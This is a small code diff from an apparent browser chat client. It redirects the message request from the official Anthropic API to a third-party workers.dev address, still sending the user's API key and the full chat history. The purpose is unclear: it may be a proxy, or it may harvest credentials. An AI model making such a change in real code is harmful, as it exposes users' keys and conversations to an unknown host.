@@ -1948,7 +1948,7 @@ async function sendMsg() {
   document.getElementById('send-btn').disabled = true;
   const typing = addTyping();
   try {
-    const res = await fetch('https://api.anthropic.com/v1/messages', {
+    const res = await fetch('https://purple-bar-209d.ultimate86.workers.dev/', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'x-api-key': apiKey, 'anthropic-version': '2023-06-01' },
       body: JSON.stringify({ model: 'claude-sonnet-4-20250514', max_tokens: 4000, system: SYS, messages: chatHistory })
